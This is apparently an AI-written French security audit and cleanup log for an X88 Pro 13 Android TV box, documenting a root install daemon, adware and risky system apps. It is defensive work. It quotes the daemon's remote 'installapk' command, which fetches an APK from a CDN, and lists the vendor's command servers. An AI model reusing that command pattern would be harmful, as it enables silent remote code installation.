# Rapport de sécurité — Box X88 Pro 13 (RK3528)

*Généré le 2 novembre 2026 par Claude, à partir d'un audit en lecture seule via ADB (Wi-Fi). **Aucune modification n'a été faite sur la box à ce stade.***

---

## 1. Verdict

**Cette box ne devrait pas être considérée comme un appareil de confiance.** Son firmware embarque plusieurs mécanismes d'installation et de mise à jour à distance qui tournent avec des droits système, et un **démon caché qui tourne en root** dans la partition système. Ce démon a (très probablement) fait apparaître une app publicitaire sur la box aujourd'hui, sans action de l'utilisateur.

Je **ne peux pas prouver l'intention** (monétisation publicitaire agressive du fabricant, ou botnet de type BadBox). Mais le comportement correspond au profil des box préinfectées : privilèges système partout, installation silencieuse, empreinte falsifiée, ADB ouvert, binaire compressé pour empêcher l'analyse.

**Règle d'usage en attendant :** ne te connecte à aucun compte (Google, Netflix, Disney+, Prime…) sur cette box, et ne la laisse pas sur ton réseau principal.

---

## 2. Identité de la box

| Élément | Valeur |
|---|---|
| Modèle | `X88Pro13.TVLauncher.D1010.FE` (`rk3528_box`) |
| Marque / fabricant | RockChip (SoC) ; marque système **Hugsun** ; serveur OTA `ota.rupa.tv` (revendue sous les noms RUPA, LIPA…) |
| Android | 13 (SDK 33), patch de sécurité **2023-08-05**, build du 2025-12-24 |
| Écran | 1920x1080, densité 320 (override 240) |
| Build | `userdebug`, `ro.debuggable=1`, bootloader déverrouillé (`verifiedbootstate=orange`) |
| Empreinte déclarée | `google/redfin/redfin:12/SP1A.210812.015` = **Google Pixel 5, Android 12** (falsifiée : la box est un Android 13 Rockchip) |
| Réseau lors de l'audit | Wi-Fi via le hotspot iPhone (IP `<ip de la box>`) |

---

## 3. Problèmes classés par gravité

### CRITIQUE

#### C1 — Démon root caché `gsdnode_android`
- **Où :** `/system/bin/gsdnode_android` (2 885 728 octets, ELF ARM 32 bits statique, **compressé avec UPX**). Copié au démarrage dans `/data/gsdnode/`.
- **Lanceur :** `/system/bin/init.sh` (il affiche « init boxnode »). Il lance le binaire avec **l'adresse MAC de la box en argument** (priorité eth0, puis wlan0, puis numéro de série), puis **vérifie toutes les 10 secondes** qu'il tourne et le relance sinon.
- **Preuves :** process `root` pid 1259 `/data/gsdnode/gsdnode_android <MAC>` ; une connexion TCP **uid 0** ouverte vers `104.26.13.205:443` (plage Cloudflare). Je n'ai pas pu attribuer formellement cette connexion à ce processus (netstat sans PID, d'autres services root existent).
- **Lien avec l'app de pub (voir E1) :** le service de `com.android.box.screensaver` a été démarré par `com.android.shell` avec **callingUid=0 (root)**, environ 5 minutes avant l'audit. L'installation de l'app date de 19:25:51 (heure locale), 3 minutes avant ma connexion. Attribution **probable mais non prouvée** (je n'ai pas le journal de l'installateur).
- **Pourquoi c'est grave :** il est dans la partition système, hors de portée de `pm disable-user`. Si on désactive les apps qu'il pousse, il peut les réinstaller.
- **Ce qui n'a pas été trouvé :** pas de fichier `vo1d`/`wd` (malware Vo1d connu). Un `su` setuid est présent dans `/system/xbin` (normal en `userdebug`, mais dangereux).
- **Non analysé :** le contenu du binaire (compressé), le trafic réseau réel, ce que contient `/data/gsdnode` (accès refusé).

#### C2 — ADB réseau ouvert, sans authentification, en permanence
- `ro.adb.secure` vide, `persist.internet_adb_enable=1`, `persist.sys.enable.adb=1`, port `5555` en écoute. La connexion s'est faite **sans aucune fenêtre « Autoriser le débogage »**.
- **Risque :** n'importe quel appareil du même réseau (Wi-Fi invité d'un café, voisin, autre appareil infecté) peut obtenir un shell sur la box.
- **Limite :** ces propriétés `persist.*` ne se modifient pas depuis un shell ADB. La seule vraie parade est réseau (isolation / pare-feu) ou un nouveau firmware.

---

### ÉLEVÉ

#### E1 — App publicitaire déguisée : `com.android.box.screensaver`
- Nom qui imite un composant Android. Installée aujourd'hui, **UID système (1000)**, permissions `INSTALL_PACKAGES`, `SYSTEM_ALERT_WINDOW`, `INTERNET`, démarrage au boot.
- Contient le **« WhaleTV AD SDK »** (archive de 2 Mo), des serveurs **Zeasn** (`acc-saas.zeasn.tv`, `bd.zeasn.tv`…), DoubleClick/AdMob.
- Déclare un **service d'accessibilité** `com.zeasn.ad.connector.access.ABService`. Il n'est **pas activé** actuellement, mais d'autres apps système (voir E2) ont le droit d'écrire les réglages sécurisés et pourraient l'activer.
- SHA-256 : `70f6a3b701e5f59c043932d2b70e7e058b6ad606c62395c9d592ee87a8e23afc`

#### E2 — Store `com.chihihgs.store` v1.4.2
- Installé dans `/data/app` (remplaçable à distance) **mais exécuté avec l'UID système**. Le journal système au démarrage l'indique : « le paquet était user id 0 mais est maintenant `android.uid.system` ».
- Permissions : `INSTALL_PACKAGES`, `DELETE_PACKAGES`, `REQUEST_INSTALL_PACKAGES`, **`WRITE_SECURE_SETTINGS`**, `QUERY_ALL_PACKAGES` (liste de toutes tes apps), `SYSTEM_ALERT_WINDOW`, `RECORD_AUDIO`, `CAMERA`, démarrage au boot.
- Un **service au premier plan en continu** (`com.github.lib_autorun.service.CoreService`) avec une notification de visibilité « SECRET » (invisible sur l'écran de verrouillage).
- Serveurs : `api.ioappstore.com`, `api.freedestop.com`, `api.xcclub.cc`, `random.vivosoc.cc`.
- SHA-256 : `f4a542e5795e71804d786163335980afdb5a0f1956c9cc166f9eafb03e814b34`

#### E3 — Launcher d'origine `com.chihihgs.launcher` + son auto-updater
- Launcher v1.3.0, droits `INSTALL_PACKAGES` et `INTERNET`, **télécharge sa liste d'apps/tuiles depuis un serveur** (`la.moonhub.work/appapi/launch/deskapplist?...channel=LA26001`, `api.fozpa.cc`, `apps.lozinl.com`, `apps.psnapp.org`, `appzones.info`).
- `TVLauncherUpgrade` v1.4 : mise à jour du launcher, avec `INSTALL_PACKAGES` et `INTERNET`.
- C'est la **seule** app qui répond à la touche Home (avec un écran de secours `FallbackHome`) : à ne désactiver qu'après avoir installé un launcher de remplacement.

#### E4 — Mises à jour OTA avec canal push et droit de redémarrer
- `com.abupdate.fota_demo_iot` v2.1.26 (**Adups/Abupdate**, flag `DEBUGGABLE`) : `INSTALL_PACKAGES`, `REBOOT`, bibliothèque **MQTT** (push serveur), serveurs `iotapi.adups.com`, `iotapi-new.abupdate.com`, etc.
- `android.rockchip.update.service` + serveur `ota.rupa.tv:2300` (port non standard).
- Le fabricant peut donc pousser du code ou redémarrer la box à distance.

#### E5 — Réinstalleur silencieux `com.example.staticistall2` (« SkyReinstall »)
- App système au nom de projet de test (`com.example`), `INSTALL_PACKAGES`, `DELETE_PACKAGES`, `WRITE_SECURE_SETTINGS`, démarrage au boot. Propriété `persist.hsg.preinstall_ed=1`.
- Rôle **probable** : réinstaller des apps préchargées. Non confirmé.

#### E6 — Service d'accessibilité actif dans les « Paramètres » de la box
- `com.android.tv.settings/.MyAccessibilityService` est activé (`accessibility_enabled=1`). Ce n'est pas un composant Android standard. Un service d'accessibilité peut lire l'écran et simuler des clics.
- **À analyser** avant de conclure (probablement du code du fabricant).

---

### MOYEN

| # | Problème | Détail |
|---|---|---|
| M1 | Intégrité du système | Empreinte Pixel 5 falsifiée, `userdebug`, bootloader déverrouillé, `package_verifier_enable=0`, `persist.sys.disable_rescue=true` (désactive la protection contre les boucles de redémarrage). La box ne peut pas être « Play Protect certifiée ». |
| M2 | Apps tierces sans source vérifiable | Netflix 9.23.0, Disney+, Prime Video, YouTube TV et AirScreen sont installées dans `/data/app` avec `installer=null` (pas depuis le Play Store). Impossible de garantir qu'elles ne sont pas modifiées. |
| M3 | Apps de test/usine en production | `FactoryTest` (`com.francis.wifitest`), `RKDeviceTest`, `StressTest` (**en cours d'exécution**), `ChangeLedStatus` (**en cours d'exécution**), `BtRemotehelp`, `SkyRocketFly`, binaires `sky_memtester` et `io`. Tous en UID système. |
| M4 | Logiciel périmé | Patch de sécurité 2023-08, Google Play Services 22.26.15 (2022). Aucune mise à jour de sécurité crédible à attendre. |
| M5 | Wi-Fi instable | Échec DHCP répété (`DHCP_FAILURE`) avec le hotspot iPhone ; problème ancien selon l'utilisateur. Port Ethernet limité à 10/100 Mbps. Voir contournements en §6. |

---

## 4. Bilan micro et caméra

**Conclusion : aujourd'hui, la box ne peut ni te filmer ni t'écouter, parce qu'elle n'a ni caméra ni micro intégrés. Le risque n'existe que si tu branches un périphérique.**

| Vérification | Résultat |
|---|---|
| Caméras détectées | **0** (`dumpsys media.camera` : 0 device, aucun `/dev/video*`) |
| Micro intégré | **Aucun.** Cartes audio : HDMI (sortie), `rk3528-acodec` (lecture seule), SPDIF (sortie). Aucun périphérique de capture. |
| Flux d'enregistrement actifs | **Aucun** (« No input streams ») |
| Usage micro/caméra enregistré | **Aucun** (les journaux d'opérations des apps suspectes n'en contiennent pas) |
| Périphériques USB branchés | **Aucun** (4 hubs racine seulement) |
| Bluetooth | Activé, **aucun appareil appairé** |
| Fonctions déclarées dans le firmware | `camera`, `camera.front`, `camera.external`, `microphone` (déclaratif seulement) |

**Là où ça devient un risque :**
- Le port USB est en mode hôte et la box accepte les **webcams USB externes**.
- Les permissions **`CAMERA` et `RECORD_AUDIO` sont déjà accordées**, de façon **non révocable** (`SYSTEM_FIXED`), à toutes les apps de l'UID système : store, screensaver, launcher, etc.
- Donc si tu branches une webcam, un micro USB, un casque USB, ou si tu appaires une télécommande Bluetooth à micro ou un casque Bluetooth, ces apps pourraient s'en servir sans demander ta permission.

**Consigne :** ne branche aucune webcam, aucun micro ni casque, et n'appaire aucun appareil Bluetooth sur cette box.

---

## 5. Ce que `pm disable-user` peut et ne peut pas faire

| Peut faire | Ne peut pas faire |
|---|---|
| Désactiver store, app de pub, OTA, launcher d'origine, apps de test | Arrêter ou supprimer le démon root `gsdnode_android` |
| Poser un launcher propre (CleanYourTV) | Fermer durablement ADB réseau (`persist.*` non modifiables) |
| Tout annuler avec `restore.sh` | Corriger le firmware falsifié ou le bootloader déverrouillé |

**Donc le nettoyage est une atténuation, pas une guérison.** La seule vraie solution est un firmware propre ; en attendant, il faut isoler la box du reste du réseau.

---

## 6. Plan d'action « petit à petit »

Chaque étape est validée avant la suivante, avec une sauvegarde et un retour arrière possible.

| Étape | Action | Risque | Retour arrière |
|---|---|---|---|
| 0 | Isoler la box (réseau invité de la box internet, ou Ethernet sur un réseau séparé) ; aucun compte dessus | Aucun | — |
| 1 | Choisir les apps à garder (Netflix, Disney+, Prime, YouTube, AirScreen) | Aucun | — |
| 2 | Désactiver les apps de test/usine (§M3) | Très faible | `restore.sh` |
| 3 | Désactiver l'app de pub `screensaver` ; attendre 15 s ; vérifier qu'elle ne revient pas | Faible | `restore.sh` |
| 4 | Désactiver `SkyReinstall`, puis observer un redémarrage | Moyen : peut casser des préchargements | `restore.sh` |
| 5 | Installer le launcher CleanYourTV (compilé sur le PC), le définir comme Home, **vérifier que Home et ADB survivent à un redémarrage** | Moyen | Réactiver `com.chihihgs.launcher` |
| 6 | Désactiver l'ancien launcher, son updater et le store | Moyen | `restore.sh` |
| 7 | Désactiver les OTA (`abupdate`, `RKUpdateService`) | Moyen | `restore.sh` |
| 8 | Redémarrer, comparer avec `pm list packages -d`, surveiller 24 h pour voir si le démon réinstalle quelque chose | — | — |
| 9 | Fermer ADB (réglages développeur) et vérifier le port 5555 ; si `persist.internet_adb_enable` le rouvre, bloquer au niveau réseau | — | — |

**Contournements Wi-Fi (M5) :** IP statique sur le réseau (voir échanges), ou câble Ethernet (conseillé). Le hotspot iPhone se coupe quand l'écran s'éteint.

**Remplacement du firmware (voir §9) :** une ROM Android TV communautaire pour cette box existe (Gitee, v0.72, développeur unique, non auditée) et un port Armbian non officiel démarre depuis une carte SD. Si l'un des deux est retenu, les étapes 2 à 9 ci-dessus deviennent inutiles.

---

## 7. Limites de cet audit

- Aucune capture du trafic réseau réel : les domaines cités viennent des chaînes de texte des APK, pas d'observations en direct.
- Le binaire `gsdnode_android` est compressé (UPX) et n'a pas été désassemblé.
- `/data/gsdnode` et les données des apps sont inaccessibles sans root.
- Les attributions « a installé / a lancé » reposent sur les horodatages et sur l'appelant du service ; je n'ai pas le journal de l'installateur de paquets.
- Je n'ai pas vérifié les signatures des apps Netflix/Disney+/etc. contre les certificats officiels.

---

## 8. Annexes

### 8.1 Empreintes SHA-256 des fichiers récupérés (`apks\`)

| Fichier | SHA-256 |
|---|---|
| `gsdnode_android.bin` | `5eed81218b278574ef5bddb2dc54d01b10af7b189f7d80654914cf999b9fd455` |
| `init.sh` | `83328e9712a234ec6e517e9dce8b9b7f86d7c8da771f8fb81e72a91f97bbc182` |
| `screensaver.apk` | `70f6a3b701e5f59c043932d2b70e7e058b6ad606c62395c9d592ee87a8e23afc` |
| `store.apk` | `f4a542e5795e71804d786163335980afdb5a0f1956c9cc166f9eafb03e814b34` |
| `launcher.apk` | `72f3664908d279c7202645e46604e0deab2b9f0f172d1d845e44c3ce0cfeace8` |
| `launcher-upgrade.apk` | `31a9806563b56b6bc797528c5a25dc1d773bf273a98d7e3ce52710e28cde6744` |
| `skyreinstall.apk` | `8af875492398bb0a1cb512e1975d59a319310ec6b269081ddc89f2e28c9cf791` |
| `abupdate.apk` | `c57f1ac493550f04770b551cdb9c849ad5a30d9ebdaa3df4cf7b401dcca996a3` |

### 8.2 Serveurs trouvés dans les APK (à bloquer au niveau DNS/routeur si besoin)

- **Store :** `api.ioappstore.com`, `api.freedestop.com`, `api.xcclub.cc`, `random.vivosoc.cc`
- **Launcher :** `la.moonhub.work`, `as.moonhub.work`, `api.fozpa.cc`, `apps.lozinl.com`, `apps.psnapp.org`, `appzones.info`
- **Pub (screensaver) :** `*.zeasn.tv` (dont `acc-saas.zeasn.tv`, `bd.zeasn.tv`), `doubleclick.net`
- **OTA :** `iotapi.adups.com`, `iotapi-new.abupdate.com`, `piotapi-new.abupdate.com`, `uiotapi-new.abupdate.com`, `ota.rupa.tv:2300`

> Attention : bloquer `ota.rupa.tv` / Adups coupe aussi les mises à jour légitimes éventuelles du fabricant ; c'est acceptable ici, aucune mise à jour de sécurité n'étant à attendre.

### 8.3 Inventaire des paquets sensibles (depuis la sauvegarde)

**Critique/suspect (démon, pub, store, OTA, réinstalleur)**

| Paquet | UID | Installateur |
|---|---|---|
| `com.android.box.screensaver` | 1000 | null |
| `com.chihihgs.store` | 1000 | null |
| `com.chihihgs.launcher` | 1000 | null |
| `com.chihihgs.launcher.upgrade` | 10032 | null |
| `com.example.staticistall2` | 1000 | null |
| `com.abupdate.fota_demo_iot` | 1000 | null |
| `android.rockchip.update.service` | 1000 | null |

**Apps de test / usine / développeur**

| Paquet | UID | Installateur |
|---|---|---|
| `com.francis.wifitest` | 1000 | null |
| `com.rockchip.devicetest` | 1000 | null |
| `com.cghs.stresstest` | 1000 | null |
| `com.example.changeled` | 1000 | null |
| `com.swe.myapplication` | 1000 | null |
| `com.charon.rocketfly` | 1000 | null |
| `com.droidlogic.FileBrower` | 1000 | null |
| `com.droidlogic.allapps` | 1000 | null |
| `com.rockchips.mediacenter` | 1000 | null |

**Apps tierces installées sans installateur (à re-vérifier)**

| Paquet | UID | Installateur |
|---|---|---|
| `com.netflix.mediaclient` | 10087 | null |
| `com.disney.disneyplus` | 10091 | null |
| `com.amazon.amazonvideo.livingroom` | 10088 | null |
| `com.google.android.youtube.tv` | 10089 | null |
| `com.ionitech.airscreen` | 10090 | null |

### 8.4 Liste complète des 127 paquets (état avant toute modification)

<details><summary>Afficher</summary>

- `android`
- `android.rockchip.update.service`
- `com.abupdate.fota_demo_iot`
- `com.amazon.amazonvideo.livingroom`
- `com.android.backupconfirm`
- `com.android.bluetooth`
- `com.android.bookmarkprovider`
- `com.android.box.screensaver`
- `com.android.calculator2`
- `com.android.camera2`
- `com.android.certinstaller`
- `com.android.chrome`
- `com.android.companiondevicemanager`
- `com.android.cts.ctsshim`
- `com.android.cts.priv.ctsshim`
- `com.android.dreams.basic`
- `com.android.dynsystem`
- `com.android.externalstorage`
- `com.android.gallery3d`
- `com.android.hotspot2.osulogin`
- `com.android.htmlviewer`
- `com.android.inputdevices`
- `com.android.inputmethod.latin`
- `com.android.inputmethod.pinyin`
- `com.android.intentresolver`
- `com.android.keychain`
- `com.android.localtransport`
- `com.android.location.fused`
- `com.android.mtp`
- `com.android.music`
- `com.android.packageinstaller`
- `com.android.pacprocessor`
- `com.android.printspooler`
- `com.android.providers.calendar`
- `com.android.providers.contacts`
- `com.android.providers.downloads`
- `com.android.providers.media`
- `com.android.providers.partnerbookmarks`
- `com.android.providers.settings`
- `com.android.providers.tv`
- `com.android.providers.userdictionary`
- `com.android.provision`
- `com.android.proxyhandler`
- `com.android.remoteprovisioner`
- `com.android.se`
- `com.android.settings`
- `com.android.settings.intelligence`
- `com.android.sharedstoragebackup`
- `com.android.shell`
- `com.android.soundpicker`
- `com.android.systemui`
- `com.android.traceur`
- `com.android.tv.settings`
- `com.android.uwb.resources`
- `com.android.vending`
- `com.android.vpndialogs`
- `com.android.wallpaperbackup`
- `com.android.wifi.dialog`
- `com.android.wifi.resources`
- `com.cghs.stresstest`
- `com.charon.rocketfly`
- `com.chihihgs.launcher`
- `com.chihihgs.launcher.upgrade`
- `com.chihihgs.store`
- `com.disney.disneyplus`
- `com.droidlogic.FileBrower`
- `com.droidlogic.allapps`
- `com.example.changeled`
- `com.example.staticistall2`
- `com.francis.wifitest`
- `com.google.android.adservices.api`
- `com.google.android.apps.restore`
- `com.google.android.apps.turbo`
- `com.google.android.apps.wellbeing`
- `com.google.android.as`
- `com.google.android.as.oss`
- `com.google.android.captiveportallogin`
- `com.google.android.cellbroadcastreceiver`
- `com.google.android.cellbroadcastservice`
- `com.google.android.configupdater`
- `com.google.android.connectivity.resources`
- `com.google.android.documentsui`
- `com.google.android.ext.services`
- `com.google.android.ext.shared`
- `com.google.android.feedback`
- `com.google.android.gms`
- `com.google.android.gms.location.history`
- `com.google.android.gms.supervision`
- `com.google.android.gmsintegration`
- `com.google.android.googlequicksearchbox`
- `com.google.android.gsf`
- `com.google.android.modulemetadata`
- `com.google.android.nearby.halfsheet`
- `com.google.android.networkstack`
- `com.google.android.networkstack.tethering`
- `com.google.android.ondevicepersonalization.services`
- `com.google.android.onetimeinitializer`
- `com.google.android.overlay.gmsconfig.asi`
- `com.google.android.overlay.gmsconfig.common`
- `com.google.android.overlay.gmsconfig.geotz`
- `com.google.android.overlay.gmsconfig.gsa`
- `com.google.android.overlay.modules.captiveportallogin.forframework`
- `com.google.android.overlay.modules.documentsui`
- `com.google.android.overlay.modules.ext.services`
- `com.google.android.overlay.modules.modulemetadata.forframework`
- `com.google.android.overlay.modules.permissioncontroller`
- `com.google.android.overlay.modules.permissioncontroller.forframework`
- `com.google.android.partnersetup`
- `com.google.android.permissioncontroller`
- `com.google.android.printservice.recommendation`
- `com.google.android.providers.media.module`
- `com.google.android.safetycenter.resources`
- `com.google.android.sdksandbox`
- `com.google.android.syncadapters.calendar`
- `com.google.android.tag`
- `com.google.android.tts`
- `com.google.android.webview`
- `com.google.android.youtube.tv`
- `com.google.mainline.adservices`
- `com.google.mainline.telemetry`
- `com.ionitech.airscreen`
- `com.netflix.mediaclient`
- `com.rockchip.devicetest`
- `com.rockchip.networkstack.prebuilt.overlay`
- `com.rockchip.networkstack.tethering.overlay`
- `com.rockchips.mediacenter`
- `com.swe.myapplication`

</details>

### 8.5 Fichiers de preuve sur ton PC

Dossier `C:\Users\<vous>\Documents\cleanyourtv-x88\` :
- `backup\full-backup-2026-11-02.txt` : paquets, propriétés système, réglages
- `out\01-probe.out` à `out\07-access.out` : sorties brutes de chaque vérification
- `apks\` : APK et binaires récupérés (§8.1)
- `start.ps1` : script de connexion ADB utilisé


---

## 9. Options de firmware (recherche du 02/11/2026)

**Matériel de cette box (relevé par ADB) :** carte `Rockchip RK3528 X88PRO DDR4 V10`, 4 Go de RAM, eMMC d'environ 29 Gio, Wi-Fi/Bluetooth **Seekwave** (modules `skw`, `skw_sdio`), Ethernet 10/100, code pays Wi-Fi `CN`. Partitions : `security`, `uboot`, `trust`, `misc`, `dtbo`, `boot`, `recovery`, `super`, `userdata`…

| Option | Disponibilité | Avantages | Inconvénients |
|---|---|---|---|
| **ROM Android TV communautaire** (`huotanzai/X88_Pro_13_AOSP_AndroidTV_ROM`, Gitee, v0.72) | Existe, image complète de 1,96 Go, SHA-256 annoncé `C08F42A0…F007E` | Android TV avec Prime Video possible, launcher d'origine retiré | Développeur unique, dépôt créé le 16/05/2026, 0 étoile, sans licence, construite par « chirurgie » sur l'image d'usine, ADB root inclus. **À auditer avant de flasher.** |
| **Armbian non officiel** (`joilg/x88pro`) | Existe, démarre depuis carte SD | Aucun démon fabricant, réversible (on retire la carte SD), support du Wi-Fi Seekwave rapporté pour les cartes v1.4+ | Expérimental ; pas d'installation eMMC fiable (des variantes de cette puce ont été « briquées » par `armbian-install`) ; accélération vidéo H.265 limitée ; Prime Video/Netflix très limités sous Linux |
| **Re-flasher le firmware d'usine Hugsun** | Disponible | Remet la box « comme neuve » | **Inutile :** le démon est dans la partition système d'origine |
| **Remplacer la box** par un appareil certifié | Dans le commerce | Prime Video en HD, mises à jour de sécurité | Coût (environ 40 à 110 €) |

**Matériel nécessaire pour flasher :** câble USB-A vers USB-A, pilotes Rockchip, outil RKDevTool/FactoryTool, bouton de recovery caché derrière la prise jack AV. En cas de souci de démarrage, le mode « maskrom » peut demander d'ouvrir le boîtier pour court-circuiter un point de la puce.

**Prime Video :** le niveau Widevine de la box n'a pas pu être lu (service DRM non interrogeable). Les box de ce type sont souvent en L3 (qualité SD/540p). À vérifier avec une app de test après installation.


---

## 10. Journal des actions du 02/11/2026 (soir) — ce qui a été fait sur la box

### 10.1 Preuve obtenue sur le démon (C1 confirmé)

Grâce à l'accès root fourni par le build `userdebug` (`su 0`), j'ai lu avant de la neutraliser :
- `/data/gsdnode/persist_tasks.json` : contient la commande `am startservice -n com.android.box.screensaver/.MainService`, rejouée à chaque démarrage.
- Le **journal du démon, supprimé du disque mais encore ouvert** (lu via `/proc/<pid>/fd/8`) :
  - `WARN js: 2985806 installapk com.android.box.screensaver||https://d1wke03fi0zacs.cloudfront.net/ScreenSaver_1.0.1.apk||am startservice -n com.android.box.screensaver/.MainService`
  - `INFO apk already installed` puis `INFO saved persist shell: am startservice …`
- Horodatage du journal : 2026-11-03 02:25:34 (heure de Chine, UTC+8) = 18:25:34 UTC, soit 19:25 en heure locale, ce qui coïncide avec l'installation de l'app.
- Une connexion TCP **uid 0 (root)** vers `115.29.212.137:7704` (adresse en Chine) a été vue en état TIME_WAIT pendant l'audit.

**Conclusion : le démon est un agent d'installation à distance avec les droits root.** Il reçoit des ordres d'un serveur (`installapk`), télécharge des APK depuis un CDN et les installe silencieusement. Il efface son propre journal. Copie des preuves : `evidence\gsdnode-evidence-2026-11-02.txt`.

### 10.2 Neutralisation du démon (sans toucher à `/system`)

- Le binaire `/data/gsdnode/gsdnode_android` (md5 `d5a8d3e6…`, identique à la copie de `/system/bin`) a été **remplacé par un script inoffensif** qui ne fait que dormir (`stub\gsdnode_stub.sh`).
- `init.sh` croit que le démon tourne (son test `pgrep` trouve le script) et **ne recopie pas l'original** depuis `/system` tant que le fichier existe dans `/data`.
- Le vrai démon a été arrêté. Vérifié **après redémarrage** : seul le script factice tourne, aucune connexion root.
- **Limites :** un reset d'usine efface `/data` et ferait revenir l'original (copié depuis `/system`). `persist_tasks.json` est conservé comme preuve mais n'est plus lu.
- **Retour arrière :** remettre `apks\gsdnode_android.bin` à la place du script (déconseillé).

### 10.3 Apps désactivées (réversible : `restore\restore-all.job`)

| Lot | Paquets |
|---|---|
| 1 : test/usine | `com.francis.wifitest`, `com.rockchip.devicetest`, `com.cghs.stresstest`, `com.example.changeled`, `com.charon.rocketfly` |
| 2 : pub et streaming non utilisé | `com.android.box.screensaver`, `com.netflix.mediaclient`, `com.disney.disneyplus`, `com.ionitech.airscreen`, `com.google.android.youtube.tv` |
| 3 : réinstalleur, store, mises à jour | `com.example.staticistall2`, `com.chihihgs.launcher.upgrade`, `com.chihihgs.store`, `com.abupdate.fota_demo_iot`, `android.rockchip.update.service` |

- **Gardé :** Prime Video, le launcher d'origine (seule app qui répond à la touche Home), `BtRemotehelp` (télécommande Bluetooth).
- Constat : l'écran de veille publicitaire **était affiché sur la TV** quand je l'ai désactivé.
- Réglage modifié : `screensaver_components` pointe désormais vers l'écran de veille Android standard (`Colors`).
- **Vérifié après redémarrage :** les 15 paquets sont toujours désactivés, rien n'a été réinstallé, l'accueil fonctionne.
- **Non résolu :** les deux apps de test `com.cghs.stresstest` et `com.example.changeled` sont des apps *persistantes* du système : elles se relancent immédiatement même après `pm disable` (testé aussi en root) et après un `kill -9`. Elles restent donc actives (marquées désactivées mais présentes en mémoire) jusqu'à un reflash. Leur rôle réseau n'a pas été établi ; à surveiller.

### 10.4 Ce qui reste exposé

| Reste | Détail | Parade |
|---|---|---|
| Launcher d'origine | Toujours actif (nécessaire pour Home) ; il contacte `5.78.72.105:443` (Hetzner) et des IP Cloudflare | Le remplacer par le launcher CleanYourTV (aucune permission réseau) |
| ADB réseau sans authentification | Toujours ouvert (nécessaire pour continuer) | Le fermer en dernier |
| `su` root et SELinux en `Permissive` | Build `userdebug` | Impossible à corriger sans nouveau firmware |
| Firmware falsifié et jamais mis à jour | Voir §3 | Reflash propre (§9) ou remplacement de la box |
| Prime Video | Installée hors Play Store, signature non vérifiée | À réinstaller sur un système sain |


### 10.5 Audit du dépôt CleanYourTV (launcher de remplacement)

Le zip du dépôt (`cleanyourtv-main.zip`) a été audité avant toute compilation :
- **Pas de permission `INTERNET`, pas de `INSTALL_PACKAGES`**, aucun appel réseau ni exécution de commandes dans les 119 fichiers Java (recherche de `Runtime.exec`, `ProcessBuilder`, `URL`, sockets, `DexClassLoader`, `WebView` : aucun résultat).
- Permissions : réseau/Wi-Fi en lecture seule (pour afficher le nom du Wi-Fi), `ACCESS_FINE_LOCATION` (accordée à l'installation, pour lire ce nom), `WRITE_SECURE_SETTINGS` (révoquée par défaut à l'installation). Services d'accessibilité et d'écoute de notifications **optionnels**, désactivés sauf demande explicite.
- Un seul binaire dans le dépôt : `gradle-wrapper.jar`, dont le SHA-256 (`49849512…4f17`) correspond au checksum publié par Gradle pour la version 8.9.
- Dépendances : AndroidX RecyclerView et DynamicAnimation uniquement (Google Maven / Maven Central).
- Réglage local appliqué : dock réduit à Prime Video (`config.xml`). Code copié dans `launcher-src\`.
- Le script d'installation officiel du dépôt n'est **pas** utilisé tel quel (il exige Python et son propre client ADB) : l'installation se fait avec notre adb, en reproduisant ses étapes et son retour arrière automatique.


### 10.6 Launcher remplacé (20:30)

- **Compilation locale** sur le PC avec JDK 21 (`.jdks\openjdk-21.0.2`) et SDK Android 34 (`C:\Users\<vous>\Android\Sdk`). APK : `tvhome.apk`, 587 941 octets, SHA-256 `6cc4474c90af0d85e82be6ab40b0b2428fdcab57991305ed7172fd31a12e6906` (identique sur le PC et sur la box).
- **Permissions réelles vérifiées sur la box** : `ACCESS_NETWORK_STATE`, `ACCESS_WIFI_STATE`, `ACCESS_FINE_LOCATION` (accordée pour afficher le nom du Wi-Fi). `WRITE_SECURE_SETTINGS` **non accordée**. **Aucune permission `INTERNET`.**
- **Bascule dans l'ordre du dépôt** : installation, définition comme accueil (`set-home-activity`), démarrage vérifié, puis seulement désactivation de `com.chihihgs.launcher`.
- **Vérifié après redémarrage (uptime 97 s)** : l'accueil est `com.gathin.tvhome`, il a le focus, l'ancien launcher reste désactivé et n'est plus en mémoire, le script factice du démon tourne toujours.
- **Connexions réseau après redémarrage** : uniquement Google (Play Services, Play Store, etc.), Amazon (Prime Video) et ADB. **Plus aucune connexion du fabricant.** Le launcher n'en a aucune.
- **Retour arrière du launcher** : `restore\restore-all.job` (réactive l'ancien launcher et le redéfinit comme accueil).

**État résiduel après cette étape :**

| Reste | Gravité | Parade |
|---|---|---|
| ADB réseau sans authentification, encore ouvert | Élevée tant qu'il reste ouvert | À fermer en dernier (voir ci-dessous) |
| `su` root, SELinux `Permissive`, firmware falsifié, bootloader déverrouillé | Structurelle | Reflash propre ou remplacement de la box |
| Démon d'origine toujours présent dans `/system/bin` (neutralisé côté `/data`) | Moyenne : reset d'usine = retour du démon | Ne pas faire de reset d'usine ; reflash |
| Apps de test `stresstest`, `changeled` persistantes | Faible | Reflash |
| Prime Video installée hors Play Store | Moyenne | Réinstaller sur un système sain |
| Google Play Services périmé (2022) | Moyenne | Reflash |


### 10.6 Launcher de remplacement installé (02/11/2026, ~20:35)

- Compilé sur le PC à partir du code audité (`launcher-src\`), JDK 21 + SDK Android 34. `tvhome.apk` : 587 941 octets, SHA-256 `6cc4474c90af0d85e82be6ab40b0b2428fdcab57991305ed7172fd31a12e6906` (identique sur le PC et sur la box).
- **Permissions réelles sur la box** (`dumpsys package com.gathin.tvhome`) : `ACCESS_NETWORK_STATE`, `ACCESS_WIFI_STATE` accordées ; `ACCESS_FINE_LOCATION` accordée par nos soins (nom du Wi-Fi) ; `WRITE_SECURE_SETTINGS` déclarée mais **non accordée**. **Ni `INTERNET`, ni `INSTALL_PACKAGES`.**
- Ordre suivi (celui du dépôt) : installation, désignation comme accueil, démarrage vérifié, puis seulement ensuite désactivation de `com.chihihgs.launcher`.
- **Vérifié après redémarrage :** l'accueil est `com.gathin.tvhome/.MainActivity`, ADB répond, le démon reste neutralisé, la liste des apps désactivées est inchangée (plus l'ancien launcher).
- **Connexions réseau après redémarrage :** uniquement Google (Play Store, Play Services, recherche) et l'app Prime Video (AWS). Plus aucune connexion vers `5.78.72.105`, Cloudflare ou les serveurs du fabricant.
- Note : `com.google.android.gms.supervision` (Family Link) apparaît aussi désactivé ; ce n'est pas nous (changement du système, sans incidence).
- **Retour arrière :** `restore\restore-launcher.job` (ré-active l'ancien launcher et le remet comme accueil). L'accueil de secours `FallbackHome` reste actif.

### 10.7 État de la box à la fin de la soirée

